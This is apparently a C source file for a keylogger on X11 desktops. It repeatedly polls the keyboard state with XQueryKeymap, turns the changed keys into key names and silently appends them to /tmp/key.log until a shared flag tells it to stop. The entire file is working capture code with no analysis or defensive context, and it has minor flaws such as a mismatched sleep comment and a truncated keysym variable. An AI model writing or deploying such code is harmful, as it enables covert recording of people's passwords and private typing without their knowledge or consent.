#include "keylogger.h"

#include <stdio.h>

int bit(unsigned char i)
{
	switch (i)
	{
		case 1: return 0;
		case 2: return 1;
		case 4: return 2;
		case 8: return 3;
		case 16: return 4;
		case 32: return 5;
		case 64: return 6;
		case 128: return 7;
	}
}

void keylogger()
{
	unsigned char keymap[32];
	unsigned char old_keymap[32];

	Display* display = XOpenDisplay(NULL);
	if (display == NULL) return;

	*flag |= IS_KEYLOGGER_RUNNING;

	XQueryKeymap(display, keymap);
	while((*flag & SHOULD_KEYLOGGER_STOP) == 0) {
		usleep(10 * 1000); // 50ms
		memcpy(old_keymap, keymap, 32);
		XQueryKeymap(display, keymap);
		for (int i = 0; i != 32; ++i) {
			if (old_keymap[i] != keymap[i]) {
				int bit_num = old_keymap[i] ^ keymap[i];
				int keycode = 8*i + bit(bit_num);
				char keysym = XkbKeycodeToKeysym(display, keycode, 0, 0);
				char *keyname = XKeysymToString(keysym);
				if ((old_keymap[i] ^ bit_num) != 0) {
					if (keyname) {
						FILE* log_file = fopen("/tmp/key.log", "a");
						fputs(keyname, log_file);
						fclose(log_file);
					}
				}
			}
		}
	}

	XCloseDisplay(display);
	*flag &= ~ IS_KEYLOGGER_RUNNING;
	*flag &= ~ SHOULD_KEYLOGGER_STOP;

	exit(0);
}

